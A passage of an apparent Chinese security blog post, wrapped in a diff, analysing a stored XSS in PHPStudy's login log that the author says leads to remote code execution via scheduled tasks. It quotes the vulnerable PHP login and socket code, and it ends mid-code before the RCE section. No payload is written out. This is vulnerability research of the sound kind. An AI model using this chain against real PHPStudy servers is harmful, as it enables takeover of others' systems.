@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="generator" content="Astro v5.9.1"><title>PHPStudy RCE 分析</title><meta name="title" content="PHPStudy RCE 分析"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="sitemap" href="/atom.xml"><link rel="alternate" type="application/atom+xml" title="Hi, I Am I" href="https://5ime.cn/atom.xml"><link rel="preload" href="/fonts/atkinson-regular.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/atkinson-bold.woff" as="font" type="font/woff" crossorigin><link rel="canonical" href="https://5ime.cn/phpstudy-xss2rce/"><meta property="og:type" content="website"><meta property="og:url" content="https://5ime.cn/phpstudy-xss2rce/"><meta property="og:title" content="PHPStudy RCE 分析"><meta property="og:description" content><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://5ime.cn/phpstudy-xss2rce/"><meta property="twitter:title" content="PHPStudy RCE 分析"><meta property="twitter:description" content><script lang="js">
+			// 动态导入 APlayer 并挂载到全局对象
+			import('aplayer').then(function(APlayerModule) {
+				window.APlayer = APlayerModule.default;
+			});
+		</script><link rel="stylesheet" href="/_astro/_slug_.BmX1OOhA.css">
+<link rel="stylesheet" href="/_astro/waline.nkDt9Ep-.css">
+<link rel="stylesheet" href="/_astro/_slug_.DKyB8MnR.css">
+<link rel="stylesheet" href="/_astro/_slug_.C4C932n7.css">
+<style>#waline[data-astro-cid-cjuph4ok]{margin:2rem 0}
+</style></head> <body class="bg-white"> <header class="relative m-0 px-4 py-4 mb-8" data-astro-cid-3ef6ksr2> <nav class="flex items-center justify-between w-full" aria-label="主导航" data-astro-cid-3ef6ksr2> <div class="hidden md:flex items-center space-x-4 w-full justify-center" data-astro-cid-3ef6ksr2> <a href="/" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> <button id="menu-btn" class="md:hidden flex flex-col space-y-1 p-2 text-black" aria-label="打开菜单" aria-expanded="false" aria-controls="menu" data-astro-cid-3ef6ksr2> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> <span class="w-6 h-0.5 bg-current transition-all" data-astro-cid-3ef6ksr2></span> </button> <div id="menu" class="md:hidden absolute top-full left-4 right-4 bg-white rounded-xl shadow-2xl border border-gray-100 backdrop-blur-md hidden mt-3 z-50" role="menu" aria-labelledby="menu-btn" data-astro-cid-3ef6ksr2> <div class="flex flex-col" data-astro-cid-3ef6ksr2> <a href="/" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Home </a> <a href="/archive" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Blog </a> <a href="/links" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Links </a> <a href="/guestbook" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> Comment </a> <a href="/about" role="menuitem" class="px-4 py-3 text-black dark:text-white hover:text-blue-600 dark:hover:text-blue-400 transition-colors"> About </a> </div> </div> </nav> </header> <script type="module">const e=document.getElementById("menu-btn"),a=document.getElementById("menu");e?.addEventListener("click",()=>{const t=e.getAttribute("aria-expanded")==="true";e.setAttribute("aria-expanded",t?"false":"true"),e.setAttribute("aria-label",t?"打开菜单":"关闭菜单"),a?.classList.toggle("hidden"),e.classList.toggle("open")});e?.addEventListener("keydown",t=>{(t.key==="Enter"||t.key===" ")&&(t.preventDefault(),e.click())});document.addEventListener("keydown",t=>{t.key==="Escape"&&!a?.classList.contains("hidden")&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"),e?.focus())});document.addEventListener("click",t=>{!e?.contains(t.target)&&!a?.contains(t.target)&&(a?.classList.add("hidden"),e?.classList.remove("open"),e?.setAttribute("aria-expanded","false"),e?.setAttribute("aria-label","打开菜单"))});</script>  <main class="min-h-screen" role="main" aria-label="文章内容"> <article class="max-w-4xl mx-auto px-2 md:px-6 pt-6 pb-32">  <header class="mb-12"> <h1 class="text-4xl md:text-5xl font-semibold text-gray-900 mb-6 tracking-tight leading-tight"> PHPStudy RCE 分析 </h1> <div class="flex flex-wrap items-center gap-3 text-sm font-light"> <time datetime="2023-02-03T23:25:34.000Z" class="text-[#86868b] tracking-wide"> <time datetime="2023-02-03T23:25:34.000Z"> Feb 3, 2023 </time> </time>  <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <span class="text-[#86868b] tracking-wide" aria-label="阅读时间 4 min read">4 min read</span>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-3" aria-label="文章分类">  <a href="/categories/技术.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看分类 技术 下的所有文章"> 技术 </a>  </nav>   <span class="text-[#d2d2d7] flex items-center" aria-hidden="true">|</span> <nav class="flex items-center gap-2" aria-label="文章标签">  <a href="/tags/漏洞复现.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 漏洞复现 下的所有文章"> 漏洞复现 </a> <span class="text-[#d2d2d7]" aria-hidden="true">·</span> <a href="/tags/网络安全.html" class="text-[#86868b] hover:text-[#0066cc] transition-colors duration-300 tracking-wide font-light" aria-label="查看标签 网络安全 下的所有文章"> 网络安全 </a>  </nav>  </div> </header>  <nav class="toc" aria-label="文章目录" data-astro-cid-woz2nwfv> <h2 class="toc-title" data-astro-cid-woz2nwfv>文章目录</h2> <ol class="toc-list" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#xss" class="toc-link" data-astro-cid-woz2nwfv> 1. XSS </a>  </li><li data-astro-cid-woz2nwfv> <a href="#漏洞代码" class="toc-link" data-astro-cid-woz2nwfv> 2. 漏洞代码 </a>  </li><li data-astro-cid-woz2nwfv> <a href="#rce" class="toc-link" data-astro-cid-woz2nwfv> 3. RCE </a>  </li><li data-astro-cid-woz2nwfv> <a href="#参考链接" class="toc-link" data-astro-cid-woz2nwfv> 4. 参考链接 </a>  </li> </ol> </nav>  <script lang="js">
+  function initTableOfContents() {
+    const links = document.querySelectorAll('.toc-link');
+    const headings = Array.from(links)
+      .map(link => {
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const id = href.slice(1);
+          return document.getElementById(id);
+        }
+        return null;
+      })
+      .filter(element => element !== null);
+
+    // 平滑滚动功能
+    function scrollToElement(targetId) {
+      const target = document.getElementById(targetId);
+      if (target) {
+        const headerOffset = 100;
+        const elementPosition = target.getBoundingClientRect().top;
+        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
+
+        window.scrollTo({
+          top: offsetPosition,
+          behavior: 'smooth'
+        });
+      }
+    }
+
+    // 设置活跃链接
+    function setActiveLink(targetId) {
+      links.forEach(link => link.classList.remove('active'));
+      
+      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
+      if (activeLink) {
+        activeLink.classList.add('active');
+        
+        if (window.location.hash.slice(1) !== targetId) {
+          history.replaceState(null, '', '#' + targetId);
+        }
+      }
+    }
+
+    // 设置平滑滚动
+    links.forEach(link => {
+      link.addEventListener('click', function(e) {
+        e.preventDefault();
+        const href = link.getAttribute('href');
+        if (href && href.startsWith('#')) {
+          const targetId = href.slice(1);
+          scrollToElement(targetId);
+        }
+      });
+    });
+
+    // 设置交集观察器
+    const observer = new IntersectionObserver(
+      function(entries) {
+        const visibleEntries = entries.filter(entry => entry.isIntersecting);
+        if (visibleEntries.length > 0) {
+          const visibleEntry = visibleEntries.reduce(function(prev, current) {
+            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
+          });
+          setActiveLink(visibleEntry.target.id);
+        }
+      },
+      { rootMargin: '-10% 0px -70% 0px' }
+    );
+
+    headings.forEach(function(heading) {
+      observer.observe(heading);
+    });
+
+    // 处理初始哈希
+    function handleInitialHash() {
+      const hash = window.location.hash;
+      if (hash) {
+        setTimeout(function() {
+          const targetId = hash.slice(1);
+          scrollToElement(targetId);
+          setActiveLink(targetId);
+        }, 300); // 增加延迟时间，确保页面完全加载
+      }
+    }
+
+    // 处理哈希变化
+    function handleHashChange() {
+      const hash = window.location.hash;
+      if (hash) {
+        const targetId = hash.slice(1);
+        scrollToElement(targetId);
+        setActiveLink(targetId);
+      }
+    }
+
+    // 确保在不同加载阶段都能正确处理锚点
+    handleInitialHash();
+    window.addEventListener('popstate', handleInitialHash);
+    window.addEventListener('hashchange', handleHashChange);
+    
+    // 页面完全加载后再次检查
+    window.addEventListener('load', function() {
+      setTimeout(handleInitialHash, 100);
+    });
+  }
+
+  // 初始化
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initTableOfContents);
+  } else {
+    initTableOfContents();
+  }
+</script>  <div class="fancybox-container">  <section id="article" class="prose prose-lg max-w-none" aria-label="文章正文">   <blockquote>
+<p>本质上是一个存储型 <code>XSS</code> 漏洞。通过 <code>XSS</code> 漏洞可以构造恶意 <code>js</code> 代码，在代码触发时自动发送添加 <code>计划任务</code> 的请求，从而实现 RCE</p>
+</blockquote>
+<h2 id="xss">XSS</h2>
+<p>我们直接在用户名的地方填写我们的 <code>xss</code> 地址，点击登录即可</p>
+<!--more-->
+<p><img src="https://img.5ime.cn/phpstudy_xss2rce/image-20230203224347376.png" alt="image-20230203224347376"></p>
+<p>然后我们通过正确的账号密码登录进去，发现恶意代码被正常解析了，<code>PHPStudy</code> 在展现 <code>操作日志</code> 时未进行任何过滤，所以我们可以执行任意 <code>Javascript</code> 代码</p>
+<p><img src="https://img.5ime.cn/phpstudy_xss2rce/image-20230203224453498.png" alt="image-20230203224453498"></p>
+<h2 id="漏洞代码">漏洞代码</h2>
+<p><code>account.phg</code> 主要用来获取用户登录状态，登录时调用 <code>login</code> 方法</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// com\web\service\app\account.php</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">// 登录</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($type</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">'login'</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">	$username </span><span style="color:#F97583">=</span><span style="color:#B392F0"> post</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'username'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">	$pwd </span><span style="color:#F97583">=</span><span style="color:#B392F0"> post</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'password'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">	$verifycode </span><span style="color:#F97583">=</span><span style="color:#B392F0"> post</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'verifycode'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">	$res </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> Account</span><span style="color:#F97583">::</span><span style="color:#B392F0">login</span><span style="color:#E1E4E8">($username,$pwd,$verifycode);</span></span>
+<span class="line" data-line="8"><span style="color:#B392F0">	xpexit</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">json_encode</span><span style="color:#E1E4E8">($res));</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>其中 <code>post()</code> 函数经过了 <code>htmlspecialchars</code> 处理</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">function</span><span style="color:#B392F0"> post</span><span style="color:#E1E4E8">($field</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">,$default</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">$field){</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">		return</span><span style="color:#E1E4E8"> $_POST;	</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">	}</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_POST[$field])){</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">		return</span><span style="color:#E1E4E8"> $default</span><span style="color:#F97583">?</span><span style="color:#E1E4E8">$default</span><span style="color:#F97583">:</span><span style="color:#79B8FF">false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">	}</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">	if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">is_string</span><span style="color:#E1E4E8">($_POST[$field])){</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">		return</span><span style="color:#79B8FF"> htmlspecialchars</span><span style="color:#E1E4E8">($_POST[$field]);</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">	}</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">	return</span><span style="color:#E1E4E8"> $_POST[$field];</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><code>login()</code> 方法中通过 <code>Socket::request</code> 处理了参数，<code>Socket::request</code> 调用了 <code>8090</code> 端口</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// com\web\service\app\model\Account.php</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">// 登录</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">public</span><span style="color:#F97583"> static</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> login</span><span style="color:#E1E4E8">($username,$pwd,$verifycode){</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($username</span><span style="color:#F97583">==</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'用户名不能为空'</span><span style="color:#E1E4E8">);	</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($pwd </span><span style="color:#F97583">==</span><span style="color:#9ECBFF"> ''</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="8"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'密码不能为空'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="10"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#B392F0">sessionStarted</span><span style="color:#E1E4E8">()){</span></span>
+<span class="line" data-line="11"><span style="color:#B392F0">        sessionStart</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_SESSION[</span><span style="color:#9ECBFF">'code'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">||</span><span style="color:#79B8FF"> strtolower</span><span style="color:#E1E4E8">($verifycode)</span><span style="color:#F97583">!=</span><span style="color:#79B8FF">strtolower</span><span style="color:#E1E4E8">($_SESSION[</span><span style="color:#9ECBFF">'code'</span><span style="color:#E1E4E8">])){</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'验证码不正确'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">    $request </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> json_encode</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'command'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'login'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'data'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'username'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$username,</span><span style="color:#9ECBFF">'pwd'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$pwd)));</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> Socket</span><span style="color:#F97583">::</span><span style="color:#B392F0">request</span><span style="color:#E1E4E8">($request);</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">$res){</span></span>
+<span class="line" data-line="19"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'系统主服务故障，请尝试重启主服务'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="21"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> json_decode</span><span style="color:#E1E4E8">($res,</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="22"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($res[</span><span style="color:#9ECBFF">'result'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#F97583"> -</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="23"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">300</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$res[</span><span style="color:#9ECBFF">'msg'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">($res[</span><span style="color:#9ECBFF">'result'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">==</span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="26"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$res[</span><span style="color:#9ECBFF">'msg'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="27"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="28"></span>
+<span class="line" data-line="29"><span style="color:#6A737D">    //token校验</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">    $_SESSION[</span><span style="color:#9ECBFF">'this_token'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $res[</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="31"><span style="color:#6A737D">    // $access_token = md5(time()).md5(rand(1,100));</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">    $access_token </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $res[</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">    $_SESSION[</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'uid'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$res[</span><span style="color:#9ECBFF">'ID'</span><span style="color:#E1E4E8">],</span><span style="color:#9ECBFF">'username'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$res[</span><span style="color:#9ECBFF">'ALIAS'</span><span style="color:#E1E4E8">],</span><span style="color:#9ECBFF">'access_token'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$access_token);</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">    $res </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'code'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'msg'</span><span style="color:#F97583">=></span><span style="color:#9ECBFF">'登录成功'</span><span style="color:#E1E4E8">,</span><span style="color:#9ECBFF">'data'</span><span style="color:#F97583">=></span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'access_token'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$access_token),</span><span style="color:#9ECBFF">'agreement'</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$res[</span><span style="color:#9ECBFF">'AGREEMENT'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="35"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> $res;</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">}</span></span></code></pre>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// com\web\service\app\lib\socket.php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">public</span><span style="color:#F97583"> static</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> request</span><span style="color:#E1E4E8">($data){</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">    error_reporting</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">E_ALL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="4"><span style="color:#79B8FF">    set_time_limit</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">    $host </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "127.0.0.1"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">    $port </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 8090</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    $socket </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> socket_create</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">AF_INET</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">SOCK_STREAM</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">SOL_TCP</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="8"><span style="color:#6A737D">    //接收套接流的最大超时时间2秒，后面是微秒单位超时时间，设置为零，表示不管它</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">    socket_set_option</span><span style="color:#E1E4E8">($socket, </span><span style="color:#79B8FF">SOL_SOCKET</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">SO_RCVTIMEO</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"sec"</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> 2000</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"usec"</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="10"><span style="color:#6A737D">        //发送套接流的最大超时时间为6秒</span></span>
+<span class="line" data-line="11"><span style="color:#79B8FF">    socket_set_option</span><span style="color:#E1E4E8">($socket, </span><span style="color:#79B8FF">SOL_SOCKET</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">SO_SNDTIMEO</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">array</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"sec"</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> 6</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"usec"</span><span style="color:#F97583"> =></span><span style="color:#79B8FF"> 0</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    </span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">    $connection </span><span style="color:#F97583">=</span><span style="color:#F97583"> @</span><span style="color:#79B8FF">socket_connect</span><span style="color:#E1E4E8">($socket, $host, $port);</span></span>
+<span class="line" data-line="14"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#E1E4E8">$connection){</span></span>
+<span class="line" data-line="15"><span style="color:#79B8FF">        file_put_contents</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'socket.log'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'cannot connection '</span><span style="color:#F97583">.</span><span style="color:#E1E4E8">$host</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">':'</span><span style="color:#F97583">.</span><span style="color:#E1E4E8">$port</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">'  at '</span><span style="color:#F97583">.</span><span style="color:#79B8FF">date</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'Y-m-d H:i:s'</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">.</span><span style="color:#9ECBFF">"</span><span style="color:#79B8FF">\r\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">    $_data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> json_decode</span><span style="color:#E1E4E8">($data,</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="19"><span style="color:#79B8FF">    isset</span><span style="color:#E1E4E8">($_SESSION[</span><span style="color:#9ECBFF">'this_token'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> $_data[</span><span style="color:#9ECBFF">'token'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $_SESSION[</span><span style="color:#9ECBFF">'this_token'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">    $data </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> json_encode</span><span style="color:#E1E4E8">($_data);</span></span>
+<span class="line" data-line="21"></span>
+<span class="line" data-line="22"><span style="color:#E1E4E8">    $data </span><span style="color:#F97583">.=</span><span style="color:#9ECBFF"> '^^^'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="23"><span style="color:#79B8FF">    socket_write</span><span style="color:#E1E4E8">($socket, $data,</span><span style="color:#79B8FF">strlen</span><span style="color:#E1E4E8">($data));</span></span>
